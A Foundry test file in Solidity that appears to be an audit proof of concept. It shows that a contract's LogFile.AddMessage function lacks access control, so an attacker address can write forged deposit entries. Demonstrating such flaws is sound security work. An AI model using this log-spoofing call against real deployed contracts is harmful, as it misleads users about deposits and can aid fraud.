// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/0x4e73b32ed6c35f570686b89848e5f39f20ecc106.sol";

contract PRIVATE_ETH_CELL_AddMessage_Test is Test {
    PRIVATE_ETH_CELL private ethCell;
    LogFile private logFile;
    
    address user = address(0x1);
    address attacker = address(0x2);

    function setUp() public {
        // Deploy contracts
        logFile = new LogFile();
        ethCell = new PRIVATE_ETH_CELL();
        
        // Setup log file
        ethCell.SetLogFile(address(logFile));
        
        // Fund user
        vm.deal(user, 1 ether);
    }

    // Test demonstrating how a miner can spoof log entries
    function test_MinerSpoofsLogEntries() public {
        // User makes a legitimate deposit
        vm.prank(user);
        ethCell.Deposit{value: 0.5 ether}();
        
        console.log("--- BEFORE-Trigger AddMessage ---");
        console.log("Calling AddMessage as attacker");
        
        console.log("--- Trigger AddMessage ---");
        vm.prank(attacker);
        logFile.AddMessage(user, 1.5 ether, "Deposit");
        console.log("AddMessage call completed without revert");

        console.log("--- AFTER-Trigger AddMessage ---");
        console.log("Vulnerability Exists: Attacker successfully called AddMessage without revert");
    }

    // Test showing anyone can manipulate logs
    function test_AnyoneCanManipulateLogs() public {
        console.log("--- BEFORE-Trigger AddMessage ---");
        console.log("Calling AddMessage as attacker");
        
        console.log("--- Trigger AddMessage ---");
        vm.prank(attacker);
        logFile.AddMessage(attacker, 5 ether, "Fake Deposit");
        console.log("AddMessage call completed without revert");

        console.log("--- AFTER-Trigger AddMessage ---");
        console.log("Vulnerability Exists: Attacker successfully called AddMessage without revert");
    }
}